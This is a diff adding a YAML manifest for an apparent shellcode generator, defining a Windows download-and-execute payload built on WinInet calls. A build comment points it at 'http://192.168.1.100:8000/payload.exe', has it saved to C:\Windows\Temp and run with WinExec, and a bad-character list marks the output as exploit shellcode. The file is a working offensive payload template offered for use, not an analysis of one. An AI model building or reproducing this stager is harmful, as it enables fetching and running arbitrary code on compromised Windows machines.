@@ -1,0 +1,25 @@
+template: ir_http_download
+# IR workflow: HTTP download-and-run via WinInet.
+# InternetOpenA -> InternetOpenUrlA -> VirtualAlloc ->
+# InternetReadFile loop -> InternetCloseHandle x2 ->
+# CreateFileA -> WriteFile -> CloseHandle -> WinExec
+#
+# Build:
+#   uv run emitrion emitrion/manifests/ir_http_download.yaml \
+#       --url "http://192.168.1.100:8000/payload.exe" \
+#       --dst "C:\\Windows\\Temp\\payload.exe" \
+#       --no-assemble --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - InternetOpenA
+  - InternetOpenUrlA
+  - InternetReadFile
+  - InternetCloseHandle
+  - VirtualAlloc
+  - CreateFileA
+  - WriteFile
+  - CloseHandle
+  - WinExec
+  - ExitProcess
